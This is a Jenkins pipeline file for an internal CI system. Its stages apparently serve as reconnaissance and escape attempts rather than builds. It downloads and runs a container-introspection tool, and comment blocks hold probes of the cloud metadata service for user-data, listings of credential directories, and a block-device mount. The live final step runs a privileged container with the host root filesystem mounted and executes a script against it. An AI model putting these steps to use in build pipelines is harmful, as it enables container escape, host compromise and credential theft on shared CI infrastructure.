/* Before using this example, check if the below release tag(v0.3.0) is the latest.
 * You can find the latest release tag at https://git.soma.salesforce.com/dci/sfci-pipeline-sharedlib/releases
 */
@Library('sfci-pipeline-sharedlib@master') _

/* import is required only if you use one of the classes specified here:
 * https://git.soma.salesforce.com/dci/sfci-pipeline-sharedlib#classes
 */
import net.sfdc.dci.BuildUtils

/* Specify the build image you want to use.
 * Not specifying a build image will use the default build image specified here:
 * https://git.soma.salesforce.com/dci/sfci-pipeline-sharedlib/blob/master/vars/executePipeline.groovy#L4
 * (If you are fine with the default image, ignore this line)
 */
//def envDef = [ buildImage: 'ops0-artifactrepo1-0-prd.data.sfdc.net/dci/centos-golang' ]
//def envDef = [ buildImage: 'ops0-artifactrepo1-0-prd.data.sfdc.net/dci/centos-sfci-python2']
def envDef = [ buildImage: 'ops0-artifactrepo1-0-prd.data.sfdc.net/sdc/centos-sfci-golang']
//def envDef = [:]

// define any release branches here
env.RELEASE_BRANCHES = ['master','develop']

// The following statement is optional
env.SHARE_LIB_VERSION = 'v1'

executePipeline(envDef) {
    
    stage('test'){
      
        sh 'ls -al /'
        /*sh '''
        export AMICONTAINED_SHA256="d8c49e2cf44ee9668219acd092ed961fc1aa420a6e036e0822d7a31033776c9f"
        curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64" -o "/home/jenkins/amicontained" \
	    && echo "${AMICONTAINED_SHA256}  /home/jenkins/amicontained" | sha256sum -c - \
        && chmod a+x "/home/jenkins/amicontained"
        echo "amicontained installed!"
        '''*/
	
	//non-socket
	sh '''
	export AMICONTAINED_SHA256="4e32545f68f25bcbcd4cce82743e916a054e1686df44fab68420fc9f94f80b21"
        curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64" -o "/home/jenkins/amicontained" \
	    && echo "${AMICONTAINED_SHA256}  /home/jenkins/amicontained" | sha256sum -c - \
        && chmod a+x "/home/jenkins/amicontained"
        echo "amicontained installed!"
        '''  
	
	sh '/home/jenkins/amicontained -d'
	    
    }
	stage('viewfiles'){
      
	/*
	sh 'ls -al /home/jenkins'
	sh 'ls -al /home/jenkins/.jenkins/'
	sh 'ls -al /home/jenkins/.pki'
	sh 'curl http://169.254.169.254/openstack/2012-08-10/meta_data.json'
	sh 'curl http://169.254.169.254/2009-04-04/user-data'
	sh 'ls /etc'
	sh 'cat /etc/subuid'
	sh 'cat /etc/subgid'
	sh 'cat /proc/partitions'
	*/
	/*sh 'mkdir /home/jenkins/tempp'
	sh 'mknod /home/jenkins/blk b 253 1'
	sh 'mount /home/jenkins/blk /home/jenkins/tempp'
	sh 'ls -al /home/jenkins/tempp'
	*/
	sh 'chmod +x /home/jenkins/agent/workspace/pipe-2-test/shell-script.sh'
	
	sh 'docker pull dva-registry.internal.salesforce.com/dva/sfdc_centos7'
	sh 'docker run -i --privileged --cap-drop=all -v /:/rootfs dva-registry.internal.salesforce.com/dva/sfdc_centos7:latest /bin/bash -c /rootfs/jenkins/agent/workspace/pipe-2-test/shell-script.sh'
	//sh 'ls -al /var/lib/docker'
		    
    }
}
